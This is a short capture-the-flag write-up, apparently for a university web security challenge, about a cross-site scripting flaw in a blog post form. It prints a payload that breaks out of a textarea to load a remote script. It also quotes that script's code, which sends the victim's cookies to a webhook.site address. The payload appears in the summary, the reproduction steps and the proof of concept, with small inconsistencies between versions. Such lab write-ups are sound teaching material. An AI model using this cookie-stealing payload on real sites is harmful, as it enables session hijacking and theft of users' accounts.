# Challenge `Read_my_lips:No_more_scripts!` writeup

- **Vulnerability:** Cross-Site Scripting (XSS)
  - _The payload `</textarea><script src="http://web.tecnico.ulisboa.pt/ist198956/estudasses.js"></script><textarea>` was successfully injected, indicating an XSS vulnerability._

- **Where:** Location of the Vulnerability
  - _The XSS vulnerability is present in the blog post functionality of the site._

- **Impact:** Potential Consequences of Exploiting the Vulnerability
  - _The exploitation of this XSS vulnerability could allow an attacker to execute arbitrary scripts on the client's browser, potentially leading to unauthorized access, session hijacking, or other malicious activities._

- **Observations:**
  - _Include any additional information or observations relevant to the challenge._

## Steps to Reproduce

1. _Navigate to the blog post creation page._
   - _Visit the following URL: `http://mustard.stt.rnl.tecnico.ulisboa.pt:23254/`._

2. _Craft a blog post with the following payload in the content:_
   - _Payload: `<textarea><script src="http://web.tecnico.ulisboa.pt/ist198956/estudasses.js"></script><textarea>`._
   - this site has this code: window.open("https://webhook.site/3a9f1629-aa07-4da4-b8b1-890c4834ceaf?c="+document.cookie)


3. _Publish the blog post._

4. _Access the published blog post to trigger the XSS vulnerability._

## Proof of Concept

[(POC)](`name_of_the_challenge_poc.html`)

```html
<textarea><script src="http://web.tecnico.ulisboa.pt/ist198956/estudasses.js"></script><textarea>

